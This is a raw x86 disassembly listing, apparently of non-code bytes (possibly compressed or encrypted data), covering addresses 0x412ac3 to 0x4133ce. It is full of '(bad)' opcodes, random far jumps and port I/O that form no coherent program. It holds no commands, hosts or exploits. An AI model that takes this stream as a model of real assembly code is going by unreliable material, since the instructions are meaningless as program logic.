  412ac3:	mov    gs,WORD PTR [eax+ebp*1-0x2]
  412ac7:	call   DWORD PTR [edi+0x6000c87f]
  412acd:	cld    
  412ace:	mov    dl,BYTE PTR [esp+edi*2+0x2c]
  412ad2:	cmp    edx,ebx
  412ad4:	arpl   WORD PTR [ebx],sp
  412ad6:	mov    ecx,DWORD PTR [ebp+0x62]
  412ad9:	test   eax,0x48642be6
  412ade:	mov    bl,BYTE PTR es:[edi+eiz*1+0x6f5139fe]
  412ae6:	add    al,0x43
  412ae8:	loope  0x412b00
  412aea:	fdiv   DWORD PTR [edx+0x72]
  412aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aee:	dec    edx
  412aef:	and    al,0xc
  412af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412af2:	push   0x24
  412af4:	cmp    BYTE PTR [edi],dl
  412af6:	fmul   DWORD PTR [edi]
  412af8:	pushf  
  412af9:	(bad)  
  412afb:	jmp    DWORD PTR [eax]
  412afd:	pop    ss
  412afe:	pop    edx
  412aff:	and    al,0x0
  412b01:	jb     0x412b48
  412b03:	push   ebx
  412b04:	cmp    DWORD PTR [eax+0x7d],ebp
  412b07:	int    0xe1
  412b09:	retf   
  412b0a:	sub    eax,0xb7b2eefe
  412b0f:	and    eax,DWORD PTR [eax]
	...
  412b21:	add    BYTE PTR [eax],al
  412b23:	add    BYTE PTR [ecx-0x4e],cl
  412b26:	iret   
  412b27:	and    eax,DWORD PTR [ecx-0x78]
  412b2a:	aam    0x8a
  412b2c:	pop    es
  412b2d:	mov    ds:0x23aee71b,eax
  412b32:	sub    esi,edi
  412b34:	adc    dl,BYTE PTR [ecx+0x7d]
  412b37:	dec    ebx
  412b38:	adc    eax,0xf1ed0525
  412b3d:	push   es
  412b3e:	sbb    bl,al
  412b40:	jmp    DWORD PTR [ebp+0x17]
  412b43:	mov    dl,BYTE PTR ds:0xa3c0dbfd
  412b49:	sbb    edi,DWORD PTR [ebp-0x3f]
  412b4c:	js     0x412b8f
  412b4e:	or     DWORD PTR [ebx],eax
  412b50:	jnp    0x412b6c
  412b52:	mov    esi,0x4a222923
  412b57:	jne    0x412b90
  412b59:	mov    al,ds:0x825123b6
  412b5e:	mov    esp,0xfe35bf3a
  412b63:	jmp    DWORD PTR [esi+0x2c]
  412b66:	rcl    BYTE PTR [edx+0x8],0xa2
  412b6a:	cmp    bh,ah
  412b6c:	fidiv  DWORD PTR [edx+0x65c2fe29]
  412b72:	fimul  WORD PTR [edi]
  412b74:	mov    dl,0xd1
  412b76:	jge    0x412bbb
  412b78:	adc    eax,0xc24fd431
  412b7d:	push   es
  412b7e:	sbb    ecx,DWORD PTR [edi+0x33]
  412b81:	mov    esi,0x11f18a29
  412b86:	cmp    DWORD PTR [edx+0x0],ecx
	...
  412b9c:	(bad)  
  412b9d:	cmc    
  412b9e:	(bad)  [edi+0x295c82e2]
  412ba4:	push   es
  412ba5:	add    BYTE PTR [eax],dl
  412ba7:	jle    0x412b99
  412ba9:	inc    eax
  412baa:	(bad)  
  412bac:	cmp    bh,BYTE PTR [edx]
  412bae:	jmp    0xc4f55ef1
  412bb3:	adc    ebp,DWORD PTR [ebx-0xc]
  412bb6:	jno    0x412b87
  412bb8:	sbb    cl,BYTE PTR [eax+esi*2]
  412bbb:	iret   
  412bbc:	sbb    cl,BYTE PTR [eax]
  412bbe:	pusha  
  412bbf:	(bad)  
  412bc0:	sbb    dl,BYTE PTR [eax]
  412bc2:	pop    esp
  412bc3:	or     dh,0x9e
  412bc6:	out    0x3,eax
  412bc8:	add    bh,BYTE PTR [esi-0x1c]
  412bcb:	(bad)  
  412bcc:	mov    esi,0xc20c5e26
  412bd1:	jge    0x412baf
  412bd3:	jmp    FWORD PTR [esi+0x2c2c0126]
  412bd9:	cld    
  412bda:	adc    DWORD PTR [ebx+edx*4],ebp
  412bdd:	repz add DWORD PTR [ecx+edi*4],ebp
  412be1:	ds call 0x92416582
  412be7:	push   es
  412be8:	dec    edx
  412be9:	daa    
  412bea:	jno    0x412be6
  412bec:	mov    bl,0xe3
  412bee:	dec    edi
  412bef:	jge    0x412bad
  412bf1:	(bad)  
  412bf3:	add    edi,DWORD PTR [ecx]
  412bf5:	add    ebp,DWORD PTR [esi-0x23242d7b]
  412bfb:	add    ah,ch
  412bfd:	adc    DWORD PTR [ecx+ebp*1+0x0],ebp
	...
  412c11:	add    BYTE PTR [eax],al
  412c13:	add    BYTE PTR [edi+0x7d],al
  412c16:	sub    cl,BYTE PTR cs:[edi+0x26]
  412c1a:	push   ecx
  412c1b:	cld    
  412c1c:	mov    cl,0xb3
  412c1e:	add    al,0xc
  412c20:	mov    al,0xc3
  412c22:	or     al,0x14
  412c24:	ret    0x4bc
  412c27:	loopne 0x412bec
  412c29:	int3   
  412c2a:	or     al,0x14
  412c2c:	mov    dl,0xb4
  412c2e:	add    al,0xc
  412c30:	jle    0x412bf8
  412c32:	call   DWORD PTR [ebx+0x6003b593]
  412c38:	or     eax,0x2d2d82cb
  412c3d:	inc    edx
  412c3e:	psubsw mm6,QWORD PTR [ebp-0x5e95c8e7]
  412c45:	loope  0x412c8a
  412c47:	jmp    0x7d31a754
  412c4c:	jecxz  0x412c40
  412c4e:	mov    edi,0x3741b59f
  412c53:	sub    eax,DWORD PTR [ebp+0x0]
  412c56:	mov    esp,DWORD PTR [ebp-0x567b1a12]
  412c5c:	xchg   edi,eax
  412c5d:	test   DWORD PTR [edx-0x7d3cee4f],0x173fa2ad
  412c67:	jmp    0x2d64e599
  412c6c:	cmp    BYTE PTR es:[ebx-0x31],dh
  412c70:	sbb    eax,0x162523d1
  412c75:	dec    edi
  412c76:	jae    0x412c3f
	...
  412c8c:	adc    edi,DWORD PTR [ebx+0x13]
  412c8f:	in     eax,dx
  412c90:	cmp    al,BYTE PTR [eax]
  412c92:	dec    eax
  412c93:	jo     0x412c4d
  412c95:	add    eax,0x773ae904
  412c9a:	(bad)  
  412c9b:	stc    
  412c9c:	outs   dx,BYTE PTR ds:[esi]
  412c9d:	and    eax,0x2a4041fe
  412ca2:	in     eax,dx
  412ca3:	push   edx
  412ca4:	cmp    BYTE PTR gs:[esi-0x1a],dl
  412ca8:	enter  0xff67,0xd8
  412cac:	jnp    0x412cd3
  412cae:	iret   
  412caf:	sub    DWORD PTR [ebp+0x3e],ecx
  412cb2:	push   cs
  412cb3:	xchg   edi,eax
  412cb4:	sar    edi,cl
  412cb6:	push   gs
  412cb8:	cmp    cl,BYTE PTR [edi-0x41]
  412cbb:	sbb    bh,BYTE PTR [eax-0xa]
  412cbe:	mov    ch,0x0
  412cc0:	mov    ecx,0x10410ffa
  412cc5:	sar    BYTE PTR [esi-0x4bd798cd],cl
  412ccb:	mov    ecx,0x411123
  412cd0:	inc    ecx
  412cd1:	rol    DWORD PTR [ecx-0x3ad3eb3f],0x81
  412cd8:	dec    ecx
  412cd9:	add    DWORD PTR [ecx],eax
  412cdb:	add    al,ah
  412cdd:	push   0xffffffc7
  412cdf:	test   DWORD PTR [eax],edx
  412ce1:	sub    BYTE PTR [ebx+0xe9bb],al
  412ce7:	push   ebx
  412ce8:	pop    ecx
  412ce9:	jge    0xc0c3013d
  412cef:	sbb    BYTE PTR [eax],al
	...
  412d01:	add    BYTE PTR [eax],al
  412d03:	add    BYTE PTR [eax-0x2f410002],dh
  412d09:	sti    
  412d0a:	(bad)  
  412d0b:	call   FWORD PTR ds:0x1954ff34
  412d11:	or     esi,DWORD PTR [ebx]
  412d13:	rcl    BYTE PTR [ebp-0x70000000],0xa9
  412d1a:	daa    
  412d1b:	(bad)  
  412d1c:	fs (bad) 
  412d1e:	(bad)  
  412d1f:	jmp    DWORD PTR [eax-0x2f7d0000]
  412d25:	(bad)  
  412d26:	cmp    al,0x0
  412d28:	xchg   esp,eax
  412d29:	add    BYTE PTR [eax],al
  412d2b:	jb     0x412ce9
  412d2d:	jp     0x412cef
  412d2f:	add    BYTE PTR [eax+eax*1+0x0],dl
  412d33:	adc    DWORD PTR [ecx+0x65fb2aff],0xffffffb2
  412d3a:	mov    DWORD PTR [esi-0x1db8c],ecx
  412d40:	fcomi  st,st(5)
  412d42:	or     al,0xdf
  412d45:	mov    ds:0x542484,al
  412d4a:	add    BYTE PTR [ecx+0x3fb9b39],cl
  412d50:	cmp    DWORD PTR [ecx],ebx
  412d52:	jnp    0x412cf1
  412d54:	cmp    eax,0xb0000215
  412d59:	mov    ds:0x193903f7,eax
  412d5e:	jnp    0x412d99
  412d60:	ret    0xfc3
  412d63:	add    al,0x39
  412d65:	sbb    DWORD PTR [ecx-0x6b],edi
	...
  412d7c:	sub    DWORD PTR ds:0xcbc00002,ebx
  412d82:	fild   DWORD PTR [ebx]
  412d84:	cmp    DWORD PTR [ecx],ebx
  412d86:	js     0x412d90
  412d88:	mov    al,0x55
  412d8a:	ficomp WORD PTR [ebx]
  412d8c:	mov    dl,0x5d
  412d8e:	ficom  WORD PTR [ebx-0x3f]
  412d91:	pop    ds
  412d92:	add    ebx,DWORD PTR [esi+0x21d25]
  412d98:	cmp    BYTE PTR [ebx+0x12],bh
  412d9b:	add    al,0x39
  412d9d:	sbb    DWORD PTR [edx+0x13f53588],edi
  412da3:	mov    DWORD PTR ds:0xc7890bfd,ebp
  412da9:	sbb    eax,0xb09efffe
  412dae:	(bad)  
  412daf:	and    esi,ecx
  412db1:	sub    eax,0x66b70e41
  412db6:	std    
  412db7:	inc    DWORD PTR [esi+0x7eff89ac]
  412dbd:	sbb    DWORD PTR [edx],eax
  412dbf:	mov    edi,ebp
  412dc1:	xor    al,0xc6
  412dc3:	test   BYTE PTR [ecx+0xd],bh
  412dc6:	jmp    0xb041:0xa34f58a
  412dcd:	aad    0xdf
  412dcf:	pop    ss
  412dd0:	mov    ebp,0xc22caf60
  412dd5:	or     eax,0xb25fe0
  412dda:	ja     0x412def
  412ddc:	xor    eax,0xdae900
	...
  412df1:	add    BYTE PTR [eax],al
  412df3:	add    BYTE PTR [edx-0x3c2e4724],al
  412df9:	mov    esp,esi
  412dfb:	jmp    DWORD PTR [esi]
  412dfd:	and    edx,DWORD PTR [ecx]
  412dff:	rcr    BYTE PTR [edx-0x30],1
  412e02:	xchg   edi,eax
  412e03:	jp     0x412d87
  412e05:	fcom   QWORD PTR [ecx+edx*8-0x7de7dc97]
  412e0c:	cli    
  412e0d:	(bad)  
  412e0f:	inc    ebx
  412e10:	das    
  412e11:	jl     0x412da6
  412e13:	(bad)  
  412e14:	mul    BYTE PTR [edx]
  412e16:	rol    edi,1
  412e18:	sbb    al,BYTE PTR [esp+edx*4]
  412e1b:	adc    DWORD PTR [edx-0x4c40336d],esi
  412e21:	retf   
  412e22:	(bad)
  412e26:	int3   
  412e27:	xlat   BYTE PTR ds:[ebx]
  412e28:	ror    ebx,0xc4
  412e2b:	fcmovnbe st,st(3)
  412e2d:	add    dh,BYTE PTR [edx-0x40]
  412e30:	sbb    cl,ah
  412e32:	jno    0x412eaa
  412e34:	dec    edx
  412e35:	cld    
  412e36:	call   0x3880903e
  412e3b:	ror    DWORD PTR [ecx],1
  412e3d:	jne    0x412e5b
  412e3f:	loopne 0x412eab
  412e41:	into   
  412e42:	jno    0x412e7a
  412e44:	sahf   
  412e45:	jle    0x412df8
  412e47:	and    eax,0xe03c768f
  412e4c:	push   edx
  412e4d:	jg     0x412df2
  412e4f:	add    ch,BYTE PTR [esi]
  412e51:	je     0x412e99
  412e53:	push   DWORD PTR [esi+0x22]
  412e56:	popa   
  412e57:	jle    0x412e59
	...
  412e69:	add    BYTE PTR [eax],al
  412e6b:	add    BYTE PTR [edx],bl
  412e6d:	cld    
  412e6e:	call   0xccfcac76
  412e73:	(bad)  
  412e75:	add    cl,ch
  412e77:	add    edx,DWORD PTR [eax]
  412e79:	mov    esp,0xab72ccff
  412e7e:	popa   
  412e7f:	push   0x1c
  412e81:	add    BYTE PTR [edi],cl
  412e83:	outs   dx,DWORD PTR ds:[esi]
  412e84:	imul   edi,ebp,0xffffffff
  412e87:	call   0x1164ecaf
  412e8c:	and    al,0x7e
  412e8e:	inc    edi
  412e8f:	jmp    0xf1fe:0xad8b003a
  412e96:	push   esi
  412e97:	adc    bh,BYTE PTR [esi+ecx*8+0x4f]
  412e9b:	bound  eax,QWORD PTR [edi+0x19]
  412e9e:	loope  0x412ed5
  412ea0:	pop    esp
  412ea1:	and    cl,BYTE PTR [edx+0x56e9deb5]
  412ea7:	mov    eax,0x318a3371
  412eac:	dec    ebp
  412ead:	ins    DWORD PTR es:[edi],dx
  412eae:	test   BYTE PTR [esi],0x1c
  412eb1:	out    0xc2,al
  412eb3:	mul    BYTE PTR [edi+0x4]
  412eb6:	add    ebp,ecx
  412eb8:	cmp    dh,BYTE PTR [ebp+0x43]
  412ebb:	int    0xe2
  412ebd:	in     al,0xff
  412ebf:	jecxz  0x412efb
  412ec1:	add    BYTE PTR [eax+esi*8-0x47],bh
  412ec5:	and    al,BYTE PTR [ecx]
  412ec7:	out    dx,al
  412ec8:	ss clc 
  412eca:	add    ch,cl
  412ecc:	cmp    ah,bl
  412ece:	dec    DWORD PTR [ebx+0x0]
	...
  412ee1:	add    BYTE PTR [eax],al
  412ee3:	add    BYTE PTR ds:0xb9f07c00,bh
  412ee9:	and    al,BYTE PTR [edx]
  412eeb:	out    dx,al
  412eec:	push   ss
  412eed:	sub    BYTE PTR [ecx],al
  412eef:	jmp    0x59ca42e
  412ef4:	jne    0x412f6c
  412ef6:	inc    ebx
  412ef7:	int    0x6e
  412ef9:	jbe    0x412e90
  412efb:	cmc    
  412efc:	jbe    0x412f1f
  412efe:	inc    dl
  412f00:	stc    
  412f01:	ja     0x412f46
  412f03:	lds    ebx,FWORD PTR [edx-0x47]
  412f06:	dec    edi
  412f07:	add    ch,ah
  412f09:	call   DWORD PTR [bx+si+0x22]
  412f0d:	dec    esi
  412f0e:	mov    eax,DWORD PTR [esp+edi*2+0x69]
  412f12:	dec    esi
  412f13:	mov    esp,DWORD PTR [esi-0x280524fb]
  412f19:	fisttp DWORD PTR [ecx+0x37443c4c]
  412f1f:	dec    esp
  412f20:	cmp    al,0x3c
  412f22:	mov    eax,DWORD PTR [ebx+0x11]
  412f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f26:	inc    edx
  412f27:	and    al,0x14
  412f29:	xor    bh,BYTE PTR [edx+0x39]
  412f2c:	mov    ecx,esi
  412f2e:	push   eax
  412f2f:	mov    edx,DWORD PTR [esi+0x5]
  412f32:	inc    ebx
  412f33:	not    DWORD PTR [edi-0x24]
  412f36:	mov    DWORD PTR [esp+ebp*8+0x3c],ecx
  412f3a:	xchg   DWORD PTR [esp+edi*8+0x40],eax
  412f3e:	mov    DWORD PTR [esp+edi*8+0x60],eax
  412f42:	dec    esi
  412f43:	push   ecx
  412f44:	pop    ebx
  412f45:	jmp    0x412f2d
  412f47:	das    
	...
  412f5c:	(bad)  
  412f5e:	std    
  412f5f:	mov    esp,DWORD PTR [eax+eax*2+0x182b22]
  412f66:	leave  
  412f67:	mov    eax,0x38e1aa89
  412f6c:	(bad)  
  412f6e:	iret   
  412f6f:	cli    
  412f70:	sub    edi,DWORD PTR [edx-0x6581741]
  412f76:	shr    ebx,0x40
  412f79:	jno    0x412fc5
  412f7b:	and    al,0x44
  412f7d:	imul   ecx,DWORD PTR [ecx-0x90d9732],0xffffffff
  412f84:	(bad)  
  412f85:	jo     0x412fd9
  412f87:	and    al,0x5c
  412f89:	jno    0x412f61
  412f8b:	mov    ecx,DWORD PTR [eax+ebx*1+0x3e]
  412f8f:	push   edx
  412f90:	xor    BYTE PTR [ecx-0x34],dh
  412f93:	call   0xfe5ab0d1
  412f98:	cmp    ax,0x8a3a
  412f9c:	jp     0x412f4b
  412f9e:	mov    edi,0x869ff123
  412fa3:	loope  0x412fdf
  412fa5:	push   ss
  412fa6:	inc    esp
  412fa7:	rol    BYTE PTR [ecx+0x14],0x5
  412fab:	inc    esp
  412fac:	adc    eax,0xb4e7dd53
  412fb1:	adc    DWORD PTR [ecx+0x43],ecx
  412fb4:	push   ebp
  412fb5:	sbb    eax,0x29390003
  412fba:	xchg   esi,edi
  412fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fbd:	add    ebp,ebx
  412fbf:	imul   eax,DWORD PTR [eax],0x0
	...
  412fd2:	add    BYTE PTR [eax],al
  412fd4:	pop    ebp
  412fd5:	gs sahf 
  412fd7:	das    
  412fd8:	ret    0xe665
  412fdb:	daa    
  412fdc:	ins    BYTE PTR es:[edi],dx
  412fdd:	js     0x412f6c
  412fdf:	int    0x11
  412fe1:	test   al,0x19
  412fe3:	(bad)  
  412fe4:	not    BYTE PTR [edx-0x5d8adc49]
  412fea:	cmp    ecx,DWORD PTR [edx+0x51c2457d]
  412ff0:	mov    DWORD PTR [edx+0x17a2e751],edx
  412ff6:	and    esi,edi
  412ff8:	adc    ch,dl
  412ffa:	mov    ds,WORD PTR [ebx+0x1d]
  412ffd:	jno    0x412f9e
  412fff:	pop    es
  413000:	imul   ch
  413002:	out    0x13,eax
  413004:	cmp    BYTE PTR [ecx],ch
  413006:	add    al,BYTE PTR [eax]
  413008:	mov    ah,0x36
  41300a:	xchg   edi,eax
  41300b:	dec    esp
  41300c:	pusha  
  41300d:	fucom  st(7)
  41300f:	inc    ebx
  413010:	sbb    al,0xee
  413012:	mov    cs,WORD PTR [ebp+0x2252d]
  413018:	and    ebp,DWORD PTR [eax]
  41301a:	mov    ch,0x50
  41301c:	mov    dl,0x7f
  41301e:	sub    bl,BYTE PTR [esi+0x22a6008a]
  413024:	ret    
  413025:	mov    ah,0xc4
  413027:	mov    ebx,0x1ac76138
  41302d:	sar    BYTE PTR [edx],0xb4
  413030:	mov    bl,0x4e
  413032:	nop
  413033:	mov    al,0x4c
  413035:	pop    ds
  413036:	jge    0x412fc6
	...
  41304c:	add    ah,ah
  41304e:	sar    BYTE PTR [eax-0x6f617517],0xe2
  413055:	mul    edi
  413057:	sub    edx,DWORD PTR [edx+0x73225d16]
  41305d:	cmp    BYTE PTR [ecx-0x41],ah
  413060:	pop    edx
  413061:	mov    eax,0xc3f60dce
  413066:	or     al,0xf8
  413068:	push   ss
  413069:	pop    ds
  41306a:	call   0x6a4c5272
  41306f:	lahf   
  413070:	pop    edx
  413071:	hlt    
  413072:	call   0xe98ee489
  413077:	add    edi,DWORD PTR [ecx]
  413079:	sbb    DWORD PTR [ebx],0x5
  41307c:	mov    es,WORD PTR ds:[ecx+0x4]
  413080:	cmp    DWORD PTR [eax],eax
  413082:	bound  esi,QWORD PTR [edi-0x768e1fe6]
  413088:	sub    al,BYTE PTR [ecx+ebp*8]
  41308b:	add    edi,DWORD PTR [edx-0x444b09bf]
  413091:	inc    edx
  413092:	jmp    0xc5b3:0xea3fbbb6
  413099:	retf   
  41309a:	add    al,0xe0
  41309c:	or     DWORD PTR [ebx+0x18b62ca6],ecx
  4130a2:	int    0x21
  4130a4:	mov    bl,0xc3
  4130a6:	or     al,0xd4
  4130a8:	push   ebx
  4130a9:	les    eax,FWORD PTR [esp+ebp*8]
  4130ac:	ret    
  4130ad:	mov    bl,0xff
  4130af:	or     al,0x0
	...
  4130c1:	add    BYTE PTR [eax],al
  4130c3:	add    BYTE PTR [ecx-0x50],ah
  4130c6:	mov    bl,BYTE PTR [edi-0x6edd653b]
  4130cc:	push   esi
  4130cd:	adc    al,0xfe
  4130cf:	sahf   
  4130d0:	mov    esp,0x512d8a36
  4130d5:	out    0x54,al
  4130d7:	cmp    DWORD PTR [esp+ecx*2+0x1e2e97e7],ebp
  4130de:	(bad)  
  4130df:	shl    ch,cl
  4130e1:	ja     0x413065
  4130e3:	mov    edi,DWORD PTR [ebx+eax*1]
  4130e6:	ret    0xed62
  4130e9:	aas    
  4130ea:	clc    
  4130eb:	jmp    0x413152
  4130ed:	out    0xe7,eax
  4130ef:	inc    ebx
  4130f0:	inc    esi
  4130f1:	push   ds
  4130f2:	(bad)  
  4130f3:	bound  esp,QWORD PTR [ebp-0x76]
  4130f6:	inc    ebx
  4130f7:	add    eax,0x724fb50d
  4130fc:	imul   esp,DWORD PTR ds:0x1e5834ca,0xffffff8a
  413103:	and    DWORD PTR [ebx+ecx*2],edx
  413106:	add    ah,BYTE PTR [eax]
  413108:	pop    ebp
  413109:	sub    BYTE PTR [ecx-0x17e9148e],ah
  41310f:	cmp    BYTE PTR [edi-0x76],cl
  413112:	leave  
  413113:	sub    BYTE PTR [edx],dl
  413115:	inc    BYTE PTR [edx]
  413117:	and    ebp,DWORD PTR [ecx+eax*8+0x483dbd23]
  41311e:	cmp    dl,BYTE PTR [eax]
  413120:	scas   al,BYTE PTR es:[edi]
  413121:	add    eax,0xf1deadc7
  413126:	add    cl,ch
	...
  41313c:	cmp    al,BYTE PTR [eax]
  41313e:	test   esi,esp
  413140:	shl    ch,1
  413142:	cmp    ah,BYTE PTR [esi+ecx*8-0x6ec2751f]
  413149:	in     eax,dx
  41314a:	dec    edi
  41314b:	cmp    ebp,DWORD PTR [ebx+ecx*2-0x9f1ff19]
  413152:	std    
  413153:	dec    DWORD PTR [ebx]
  413155:	(bad)  [ecx+0x532c3444]
  41315b:	push   eax
  41315c:	sbb    ebp,DWORD PTR [edi-0x1f2a801a]
  413162:	std    
  413163:	cmp    edi,DWORD PTR [eax-0x10]
  413166:	mov    eax,DWORD PTR [edx]
  413168:	push   ebx
  413169:	add    DWORD PTR [eax],eax
  41316b:	sub    DWORD PTR [eax+ebp*1],0x12
  41316f:	add    BYTE PTR [edi-0x7a],cl
  413172:	cmc    
  413173:	add    ah,BYTE PTR [eax+0x1]
  413176:	cmp    ebp,0x53
  413179:	lock (bad) 
  41317b:	aam    0x50
  41317d:	add    DWORD PTR [eax],eax
  41317f:	mov    ebp,esp
  413181:	and    al,0x1e
  413183:	mov    esp,esp
  413185:	and    al,0x56
  413187:	mov    edx,DWORD PTR [esi+0x10000215]
  41318d:	test   BYTE PTR [edi-0x3f7c4e03],bh
  413193:	add    esi,DWORD PTR [edx-0x5ffc417d]
  413199:	lea    ecx,[edx+0x24]
  41319c:	or     al,0x52
  41319e:	mov    esi,ecx
	...
  4131b4:	dec    eax
  4131b5:	mov    edx,0x8c4ffff6
  4131ba:	inc    edx
  4131bb:	and    al,0x0
  4131bd:	mov    WORD PTR [edx+0x24],ss
  4131c0:	add    al,0x8c
  4131c2:	pop    edx
  4131c3:	and    al,0xe8
  4131c5:	cmp    eax,ecx
  4131c7:	push   edx
  4131c8:	dec    ebx
  4131c9:	scas   eax,DWORD PTR es:[edi]
  4131ca:	dec    esi
  4131cb:	jl     0x4131c2
  4131cd:	call   0xfd1126f4
  4131d2:	push   ebx
  4131d3:	push   ebx
  4131d4:	sub    ecx,esi
  4131d6:	xchg   DWORD PTR [esp+esi*1+0x10],eax
  4131da:	out    0x17,al
  4131dc:	cmp    DWORD PTR [esi+ebx*1],edi
  4131df:	(bad)  
  4131e0:	mov    dl,0xfa
  4131e2:	out    0x23,eax
  4131e4:	bound  ebp,QWORD PTR [eax+0x7c]
  4131e7:	sbb    BYTE PTR [ebx-0x4d3dfed7],0x5e
  4131ee:	inc    esp
  4131ef:	clc    
  4131f0:	cmp    eax,DWORD PTR [edx-0x11]
  4131f3:	out    0x76,eax
  4131f5:	jp     0x413215
  4131f7:	inc    BYTE PTR [edx+ebx*8]
  4131fa:	mov    cl,ch
  4131fc:	mov    al,0xea
  4131fe:	out    0x2b,eax
  413200:	push   ecx
  413201:	js     0x41321a
  413203:	(bad)  
  413204:	push   esi
  413205:	xchg   ecx,eax
  413206:	dec    ebx
  413207:	mov    dh,ch
  413209:	inc    edx
  41320a:	out    0x2a,al
  41320c:	jno    0x413237
  41320e:	dec    ebx
  41320f:	mov    bh,0x50
  413211:	enter  0x2d8a,0x2e
  413215:	mov    cl,0x34
  413217:	stc    
	...
  41322c:	ret    0x44cf
  41322f:	call   0x8a89587a
  413234:	jne    0x41323b
  413236:	fadd   DWORD PTR [edx]
  413238:	add    edi,edi
  41323a:	sub    al,0x7c
  41323c:	inc    ecx
  41323d:	loop   0x413206
  41323f:	and    ebp,DWORD PTR ds:0x39000228
  413245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413246:	push   ds
  413247:	jne    0x41326a
  413249:	push   ds
  41324a:	inc    edi
  41324b:	jnp    0x413262
  41324d:	mov    ?,WORD PTR [edi-0x4fa6d6dd]
  413253:	mov    ch,bh
  413255:	add    DWORD PTR [ebp-0xd],edx
  413258:	(bad)  
  413259:	add    cl,BYTE PTR [ebx-0x199a3d29]
  41325f:	daa    
  413260:	ins    BYTE PTR es:[edi],dx
  413261:	jns    0x4131ec
  413263:	int    0xd1
  413265:	(bad)  
  413266:	pop    ss
  413267:	(bad)  
  413268:	mov    dh,0x0
  41326a:	and    bh,BYTE PTR [edi+edi*1]
  41326d:	mov    WORD PTR [ebx],es
  41326f:	add    bh,BYTE PTR [ecx]
  413271:	add    BYTE PTR [edx-0x61],ch
  413274:	pop    edx
  413275:	hlt    
  413276:	call   0xeb37ee89
  41327b:	add    edi,DWORD PTR [ecx]
  41327d:	xchg   DWORD PTR [eax+ebp*8],ebx
  413280:	out    dx,al
  413281:	test   BYTE PTR [ebp-0x18584af2],dh
  413287:	add    edi,DWORD PTR [ecx]
  413289:	jg     0x413230
  41328b:	add    al,0x3e
  41328d:	cmp    BYTE PTR [eax],0x5
	...
  4132a4:	cmp    DWORD PTR [eax],eax
  4132a6:	bound  esi,QWORD PTR [edi+0x4e61b41a]
  4132ac:	and    eax,DWORD PTR [edi+0x73]
  4132af:	pop    es
  4132b0:	inc    ebx
  4132b1:	xlat   BYTE PTR ds:[ebx]
  4132b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b3:	xchg   ebp,eax
  4132b4:	cmp    BYTE PTR [edi-0x3b4c4c53],al
  4132ba:	(bad)  
  4132bb:	mul    DWORD PTR [ebx+0x3b]
  4132be:	mov    ecx,0x4cbbdb3
  4132c3:	loopne 0x41324e
  4132c5:	xchg   DWORD PTR [esi],esp
  4132c7:	mov    WORD PTR [edx+0x22c04e4],es
  4132cd:	adc    eax,DWORD PTR [ebp+0x1e]
  4132d0:	push   ecx
  4132d1:	pushf  
  4132d2:	add    al,0xd8
  4132d4:	mov    ah,dl
  4132d6:	popa   
  4132d7:	mov    bh,0x5a
  4132d9:	rcl    BYTE PTR [ebp+0x1049c3b1],1
  4132df:	loopne 0x4132cb
  4132e1:	sbb    bl,BYTE PTR ds:0xac870e8a
  4132e7:	out    0x26,eax
  4132e9:	mov    bl,0xb8
  4132eb:	mov    al,BYTE PTR [eax+ebp*1]
  4132ee:	(bad)  
  4132ef:	pop    ss
  4132f0:	iret   
  4132f1:	sbb    al,cl
  4132f3:	inc    edx
  4132f4:	mov    bl,0xbb
  4132f6:	dec    esp
  4132f8:	(bad)  
  4132f9:	pushf  
  4132fa:	punpckldq mm0,DWORD PTR [esi-0xe8dd022]
  413301:	fidiv  WORD PTR [ebx]
  413303:	jo     0x41328e
  413305:	fidiv  WORD PTR [edi]
  413307:	pusha  
	...
  41331c:	loope  0x4132fc
  41331e:	cmp    esp,DWORD PTR [edx-0x7f]
  413321:	fimul  WORD PTR [edi]
  413323:	push   ds
  413324:	enter  0x8aca,0xaf
  413328:	push   ebp
  413329:	loop   0x41331b
  41332b:	mov    dh,0x1c
  41332d:	xchg   BYTE PTR [ebx+0x5],cl
  413330:	xchg   ebp,eax
  413331:	mov    cl,0x50
  413333:	jb     0x413334
  413335:	test   edi,edx
  413337:	xchg   ecx,eax
  413338:	inc    edx
  413339:	push   cs
  41333a:	(bad)  
  41333b:	xchg   esi,eax
  41333c:	cmp    BYTE PTR ds:0x1adc5c0e,0xfe
  413343:	jmp    0xd164ea09
  413348:	popa   
  413349:	jl     0x41336e
  41334b:	in     eax,dx
  41334c:	cmp    al,BYTE PTR [eax]
  41334e:	jne    0x413361
  413350:	shr    BYTE PTR [ebp-0x423e02dd],0x23
  413357:	stc    
  413358:	in     eax,dx
  413359:	scas   eax,DWORD PTR es:[edi]
  41335a:	dec    edi
  41335b:	bound  ebp,QWORD PTR [edi+0x21]
  41335e:	icebp  
  41335f:	pop    ecx
  413360:	xor    al,0x1a
  413362:	push   esp
  413363:	call   0xe61e:0xa5884bc1
  41336a:	out    0x2f,eax
  41336c:	sub    BYTE PTR [edx],bl
  41336e:	(bad)  
  41336f:	bound  ecx,QWORD PTR [ecx]
  413371:	fisub  WORD PTR [ebx]
  413373:	jmp    0x88f8:0xb4d28682
  41337a:	dec    ebx
  41337b:	int    0xd2
  41337d:	scas   eax,DWORD PTR es:[edi]
  41337e:	mov    bl,BYTE PTR [edi]
	...
  413394:	and    eax,0x3700f269
  413399:	sti    
  41339a:	mov    eax,ebx
  41339c:	dec    ebx
  41339d:	dec    eax
  41339e:	and    bh,BYTE PTR [eax]
  4133a0:	lahf   
  4133a1:	dec    ebp
  4133a2:	mov    esi,ecx
  4133a4:	cmp    BYTE PTR [ebp-0x7768000f],bl
  4133aa:	push   0x24
  4133ac:	xor    al,0xff
  4133ae:	xlat   BYTE PTR ds:[ebx]
  4133af:	mov    ecx,DWORD PTR [eax+ebp*1+0x22]
  4133b3:	cmp    esp,ebx
  4133b5:	mov    BYTE PTR [edx+0x24],bl
  4133b8:	pop    eax
  4133b9:	jp     0x413402
  4133bb:	jmp    0x413359
  4133bd:	mov    BYTE PTR [edx+0x24],bl
  4133c0:	sub    BYTE PTR [edi+0x38682442],al
  4133c6:	test   BYTE PTR [esp+ebx*2],ah
  4133c9:	std    
  4133ca:	push   DWORD PTR [ecx+ebp*2-0x80]
  4133ce:	mov    esp,0xfffd4c28
